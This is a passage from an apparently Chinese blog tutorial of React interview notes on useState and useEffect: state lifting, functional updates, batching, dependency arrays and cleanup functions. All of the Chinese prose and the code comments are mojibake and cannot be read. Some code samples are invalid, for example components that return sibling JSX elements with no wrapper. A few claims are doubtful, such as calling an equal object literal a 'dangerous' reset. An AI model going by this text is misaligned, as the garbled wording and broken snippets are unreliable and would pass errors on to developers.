class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// çŠ¶æ€æå‡ï¼šå…±äº«çŠ¶æ€åˆ°å…±åŒç¥–å…ˆ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [sharedState, setSharedState] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChildA</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;sharedState&#125;</span> <span class="hljs-attr">setState</span>=<span class="hljs-string">&#123;setSharedState&#125;</span> /&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChildB</span> <span class="hljs-attr">state</span>=<span class="hljs-string">&#123;sharedState&#125;</span> <span class="hljs-attr">setState</span>=<span class="hljs-string">&#123;setSharedState&#125;</span> /&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// çŠ¶æ€ä¸‹æ²‰ï¼šç¼©å°çŠ¶æ€å½±å“èŒƒå›´</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// åªæœ‰æŒ‰é’®ä¾èµ– count</span><br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveComponent</span> /&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;count&#125;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(c =&gt; c + 1)&#125; /&gt;</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€åˆå¹¶æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šä½¿ç”¨å¯¹è±¡</span><br><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">flag</span>: <span class="hljs-literal">false</span> &#125;);<br><span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; ...prev, <span class="hljs-attr">count</span>: prev.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;));<br><br><span class="hljs-comment">// æ–¹æ¡ˆ2ï¼šå¤šä¸ª useState</span><br><span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">const</span> [flag, setFlag] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// æ–¹æ¡ˆ3ï¼šuseReducerï¼ˆå¤æ‚çŠ¶æ€ï¼‰</span><br><span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, &#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">flag</span>: <span class="hljs-literal">false</span> &#125;);<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-6"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-6" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆè¿ç»­è°ƒç”¨ setState ä¸æ›´æ–°ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>); <span class="hljs-comment">// æœ¬æ¬¡æ¸²æŸ“ count=0</span><br>  <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>); <span class="hljs-comment">// æœ¬æ¬¡æ¸²æŸ“ count=0</span><br>  <span class="hljs-comment">// ç»“æœï¼šcount åªå¢åŠ 1</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>é—­åŒ…æ•è·çš„ count æ˜¯å½“æ¬¡æ¸²æŸ“çš„å›ºå®šå€¼ï¼Œè§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âœ… å‡½æ•°å¼æ›´æ–°</span><br><span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br><span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><strong>Qï¼šuseState å’Œ useRef å­˜å‚¨æ•°æ®æœ‰ä½•åŒºåˆ«ï¼Ÿ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">useState</th><th align="left">useRef</th></tr></thead><tbody><tr><td align="left">è§¦å‘é‡æ¸²æŸ“</td><td align="left">æ˜¯</td><td align="left">å¦</td></tr><tr><td align="left">æ•°æ®æŒä¹…åŒ–</td><td align="left">è·¨æ¸²æŸ“ä¿ç•™</td><td align="left">è·¨æ¸²æŸ“ä¿ç•™</td></tr><tr><td align="left">æ•°æ®è®¿é—®</td><td align="left">ç›´æ¥ä½¿ç”¨ state</td><td align="left">é€šè¿‡ .current è®¿é—®</td></tr><tr><td align="left">æ›´æ–°æ–¹å¼</td><td align="left">setState å‡½æ•°</td><td align="left">ç›´æ¥ä¿®æ”¹ .current</td></tr><tr><td align="left">å…¸å‹ç”¨é€”</td><td align="left">é©±åŠ¨ UI å˜åŒ–çš„çŠ¶æ€</td><td align="left">DOM å¼•ç”¨&#x2F;ä¸è§¦å‘æ¸²æŸ“çš„å€¼</td></tr></tbody></table><p><strong>Qï¼šå¦‚ä½•å®ç°çŠ¶æ€é‡ç½®ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> initialUser = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(initialUser);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">reset</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šé‡ç½®ä¸ºåˆå§‹å€¼</span><br>    <span class="hljs-title function_">setUser</span>(initialUser);<br>    <br>    <span class="hljs-comment">// âŒ å±é™©ï¼šå¯èƒ½å¯¼è‡´å¼•ç”¨é—®é¢˜</span><br>    <span class="hljs-comment">// setUser(&#123; name: &#x27;John&#x27;, age: 30 &#125;);</span><br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ€§èƒ½ä¼˜åŒ–æŠ€å·§-1"><a href="#æ€§èƒ½ä¼˜åŒ–æŠ€å·§-1" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–æŠ€å·§"></a>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h3><p><strong>é¿å…ä¸å¿…è¦çŠ¶æ€</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ å†—ä½™çŠ¶æ€ï¼ˆå¯ä» props æ´¾ç”Ÿï¼‰</span><br><span class="hljs-keyword">const</span> [fullName, setFullName] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;name&#125;</span> <span class="hljs-subst">$&#123;surname&#125;</span>`</span>);<br><br><span class="hljs-comment">// âœ… ç›´æ¥ç”¨è®¡ç®—å€¼</span><br><span class="hljs-keyword">const</span> fullName = <span class="hljs-string">`<span class="hljs-subst">$&#123;name&#125;</span> <span class="hljs-subst">$&#123;surname&#125;</span>`</span>;<br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€éš”ç¦»å‡å°‘é‡æ¸²æŸ“</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸå§‹ç»“æ„ï¼šçŠ¶æ€å˜åŒ–å¯¼è‡´æ•´ä¸ªç»„ä»¶é‡æ¸²æŸ“</span><br><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> &#125;);<br><br><span class="hljs-comment">// ä¼˜åŒ–æ–¹æ¡ˆï¼šæ‹†åˆ†ä¸ºç‹¬ç«‹çŠ¶æ€</span><br><span class="hljs-keyword">const</span> [a, setA] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">const</span> [b, setB] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€è®°å¿†åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// âœ… é¿å…å­ç»„ä»¶ä¸å¿…è¦é‡æ¸²æŸ“</span><br>  <span class="hljs-keyword">const</span> child = <span class="hljs-title function_">useMemo</span>(<br>    <span class="hljs-function">() =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveChild</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;count&#125;</span> /&gt;</span></span>,<br>    [count] <span class="hljs-comment">// ä»… count å˜åŒ–æ—¶æ›´æ–°</span><br>  );<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;child&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸ç±»ç»„ä»¶çŠ¶æ€å¯¹æ¯”"><a href="#ä¸ç±»ç»„ä»¶çŠ¶æ€å¯¹æ¯”" class="headerlink" title="ä¸ç±»ç»„ä»¶çŠ¶æ€å¯¹æ¯”"></a>ä¸ç±»ç»„ä»¶çŠ¶æ€å¯¹æ¯”</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">useState</th><th align="left">this.state</th></tr></thead><tbody><tr><td align="left">æ›´æ–°æ–¹å¼</td><td align="left">ç‹¬ç«‹ set å‡½æ•°</td><td align="left">this.setState({})</td></tr><tr><td align="left">çŠ¶æ€åˆå¹¶</td><td align="left">ä¸è‡ªåŠ¨åˆå¹¶</td><td align="left">è‡ªåŠ¨æµ…åˆå¹¶</td></tr><tr><td align="left">å¼‚æ­¥è¡Œä¸º</td><td align="left">æ‰¹å¤„ç†æ›´æ–°</td><td align="left">æ‰¹å¤„ç†æ›´æ–°</td></tr><tr><td align="left">å‡½æ•°å¼æ›´æ–°</td><td align="left">setCount(prev &#x3D;&gt; prev+1)</td><td align="left">this.setState(prev &#x3D;&gt; {})</td></tr><tr><td align="left">åˆå§‹åŒ–</td><td align="left">æ”¯æŒæƒ°æ€§åˆå§‹åŒ–å‡½æ•°</td><td align="left">æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–</td></tr></tbody></table><h3 id="React-18-æ–°ç‰¹æ€§ï¼šè‡ªåŠ¨æ‰¹å¤„ç†"><a href="#React-18-æ–°ç‰¹æ€§ï¼šè‡ªåŠ¨æ‰¹å¤„ç†" class="headerlink" title="React 18 æ–°ç‰¹æ€§ï¼šè‡ªåŠ¨æ‰¹å¤„ç†"></a>React 18 æ–°ç‰¹æ€§ï¼šè‡ªåŠ¨æ‰¹å¤„ç†</h3><p><strong>æ‰¹å¤„ç†èŒƒå›´æ‰©å±•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React 17ï¼šåªåœ¨äº‹ä»¶å¤„ç†å‡½æ•°ä¸­æ‰¹å¤„ç†</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// ç«‹å³æ¸²æŸ“</span><br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// å†æ¬¡æ¸²æŸ“</span><br>&#125;, <span class="hljs-number">100</span>);<br><br><span class="hljs-comment">// React 18ï¼šè‡ªåŠ¨æ‰¹å¤„ç†æ‰€æœ‰æ›´æ–°</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>);   <span class="hljs-comment">// åˆå¹¶æ›´æ–°</span><br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// å•æ¬¡æ¸²æŸ“</span><br>&#125;, <span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><p><strong>ç´§æ€¥æ›´æ–°ä¸éç´§æ€¥æ›´æ–°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; startTransition &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-comment">// ç´§æ€¥æ›´æ–°ï¼ˆç”¨æˆ·è¾“å…¥ï¼‰</span><br><span class="hljs-title function_">setInputValue</span>(input);<br><br><span class="hljs-comment">// æ ‡è®°éç´§æ€¥æ›´æ–°ï¼ˆæœç´¢ç»“æœï¼‰</span><br><span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setSearchQuery</span>(input);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="3-2-useEffect-ä¸å‰¯ä½œç”¨ï¼ˆä¾èµ–æ•°ç»„ã€æ¸…ç†å‡½æ•°ï¼‰"><a href="#3-2-useEffect-ä¸å‰¯ä½œç”¨ï¼ˆä¾èµ–æ•°ç»„ã€æ¸…ç†å‡½æ•°ï¼‰" class="headerlink" title="3.2 useEffect ä¸å‰¯ä½œç”¨ï¼ˆä¾èµ–æ•°ç»„ã€æ¸…ç†å‡½æ•°ï¼‰"></a>3.2 useEffect ä¸å‰¯ä½œç”¨ï¼ˆä¾èµ–æ•°ç»„ã€æ¸…ç†å‡½æ•°ï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µæ¦‚è¿°-5"><a href="#åŸºç¡€æ¦‚å¿µæ¦‚è¿°-5" class="headerlink" title="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"></a>åŸºç¡€æ¦‚å¿µæ¦‚è¿°</h3><p>useEffect ä½œç”¨ï¼šå¤„ç†å‰¯ä½œç”¨æ“ä½œï¼šæ•°æ®è·å–ã€è®¢é˜…ç®¡ç†ã€æ‰‹åŠ¨ DOM æ“ä½œç­‰</p><p>æ ¸å¿ƒå‚æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// å‰¯ä½œç”¨é€»è¾‘</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* æ¸…ç†å‡½æ•° */</span> &#125;;<br>&#125;, [dependencies]); <span class="hljs-comment">// ä¾èµ–æ•°ç»„</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œæ—¶æœº:</p><ul><li>ç»„ä»¶æŒ‚è½½åï¼ˆcomponentDidMountï¼‰</li><li>ä¾èµ–é¡¹å˜åŒ–æ—¶ï¼ˆcomponentDidUpdateï¼‰</li><li>ç»„ä»¶å¸è½½å‰æ‰§è¡Œæ¸…ç†ï¼ˆcomponentWillUnmountï¼‰</li></ul><h3 id="ä¾èµ–æ•°ç»„æ·±åº¦è§£æ"><a href="#ä¾èµ–æ•°ç»„æ·±åº¦è§£æ" class="headerlink" title="ä¾èµ–æ•°ç»„æ·±åº¦è§£æ"></a>ä¾èµ–æ•°ç»„æ·±åº¦è§£æ</h3><p><strong>ä¸‰ç§ä¾èµ–æ¨¡å¼å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ä¾èµ–æ•°ç»„</th><th align="left">æ‰§è¡Œæ—¶æœº</th><th align="left">å¸¸è§ç”¨é€”</th></tr></thead><tbody><tr><td align="left">[]</td><td align="left">ä»…æŒ‚è½½æ—¶æ‰§è¡Œä¸€æ¬¡</td><td align="left">åˆå§‹åŒ–è¯·æ±‚ã€äº‹ä»¶è®¢é˜…</td></tr><tr><td align="left">[dep1, dep2]</td><td align="left">ä¾èµ–å˜åŒ–æ—¶æ‰§è¡Œ</td><td align="left">æ•°æ®è¯·æ±‚ã€çŠ¶æ€è”åŠ¨</td></tr><tr><td align="left">æ— ä¾èµ–</td><td align="left">æ¯æ¬¡æ¸²æŸ“åéƒ½æ‰§è¡Œ</td><td align="left">æå°‘ä½¿ç”¨ï¼ˆæ€§èƒ½å±é™©ï¼‰</td></tr></tbody></table><p><strong>ä¾èµ–é¡¹ä¼˜åŒ–æŠ€å·§</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šç¼ºå°‘å¿…è¦ä¾èµ–</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">fetchData</span>(user.<span class="hljs-property">id</span>); <br>&#125;, []); <span class="hljs-comment">// å½“ user.id å˜åŒ–æ—¶ä¸ä¼šé‡æ–°è¯·æ±‚</span><br><br><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šåŒ…å«æ‰€æœ‰ä¾èµ–</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">fetchData</span>(user.<span class="hljs-property">id</span>);<br>&#125;, [user.<span class="hljs-property">id</span>]); <br><br><span class="hljs-comment">// âœ… é«˜çº§ï¼šå‡½æ•°å¼æ›´æ–°é¿å…ä¾èµ–</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>); <span class="hljs-comment">// ä¸ä¾èµ– count</span><br>  &#125;, <span class="hljs-number">1000</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);<br>&#125;, []); <span class="hljs-comment">// ç©ºä¾èµ–å®‰å…¨</span><br></code></pre></td></tr></table></figure><p><strong>ä¾èµ–å¼•ç”¨é™·é˜±</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é—®é¢˜ï¼šå¯¹è±¡å¼•ç”¨å˜åŒ–å¯¼è‡´æ— é™å¾ªç¯</span><br><span class="hljs-keyword">const</span> config = &#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">1000</span> &#125;;<br><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">startTimer</span>(config);<br>&#125;, [config]); <span class="hljs-comment">// æ¯æ¬¡æ¸²æŸ“ config éƒ½æ˜¯æ–°å¯¹è±¡</span><br><br><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šuseMemo ç¨³å®šå¼•ç”¨</span><br><span class="hljs-keyword">const</span> config = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">1000</span> &#125;), []);<br></code></pre></td></tr></table></figure><h3 id="æ¸…ç†å‡½æ•°é«˜çº§ç”¨æ³•"><a href="#æ¸…ç†å‡½æ•°é«˜çº§ç”¨æ³•" class="headerlink" title="æ¸…ç†å‡½æ•°é«˜çº§ç”¨æ³•"></a>æ¸…ç†å‡½æ•°é«˜çº§ç”¨æ³•</h3><p><strong>æ‰§è¡Œæœºåˆ¶</strong></p><pre class="mermaid">sequenceDiagram  participant Mount as ç»„ä»¶æŒ‚è½½  participant Update as ä¾èµ–æ›´æ–°  participant Unmount as ç»„ä»¶å¸è½½  Mount->>+Effect: æ‰§è¡Œå‰¯ä½œç”¨  Update->>+Cleanup: æ‰§è¡Œæ—§æ¸…ç†å‡½æ•°  Update->>+Effect: æ‰§è¡Œæ–°å‰¯ä½œç”¨  Unmount->>+Cleanup: æ‰§è¡Œæ¸…ç†å‡½æ•°</pre><p><strong>å¸¸è§æ¸…ç†åœºæ™¯</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. æ¸…é™¤å®šæ—¶å™¨</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-comment">/*...*/</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);<br>&#125;, []);<br><br><span class="hljs-comment">// 2. å–æ¶ˆç½‘ç»œè¯·æ±‚</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();<br>  <span class="hljs-title function_">fetch</span>(url, &#123; <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> &#125;);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> controller.<span class="hljs-title function_">abort</span>(); <span class="hljs-comment">// å–æ¶ˆæœªå®Œæˆè¯·æ±‚</span><br>&#125;, [url]);<br><br><span class="hljs-comment">// 3. ç§»é™¤äº‹ä»¶ç›‘å¬</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResize</span> = (<span class="hljs-params"></span>) =&gt; &#123;<span class="hljs-comment">/*...*/</span>&#125;;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, handleResize);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;resize&#x27;</span>, handleResize);<br>&#125;, []);<br></code></pre></td></tr></table></figure><p><strong>æ¸…ç†å‡½æ•°é—­åŒ…ç‰¹æ€§</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// æ€»æ˜¯åˆå§‹å€¼ï¼ˆé—­åŒ…é™·é˜±ï¼‰</span><br>  &#125;, <span class="hljs-number">1000</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);<br>&#125;, []);<br><br><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨ ref ä¿å­˜æœ€æ–°å€¼</span><br><span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(count);<br>countRef.<span class="hljs-property">current</span> = count;<br><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(countRef.<span class="hljs-property">current</span>); <span class="hljs-comment">// æœ€æ–°å€¼</span><br>  &#125;, <span class="hljs-number">1000</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);<br>&#125;, []);<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-7"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-7" class="headerlink" 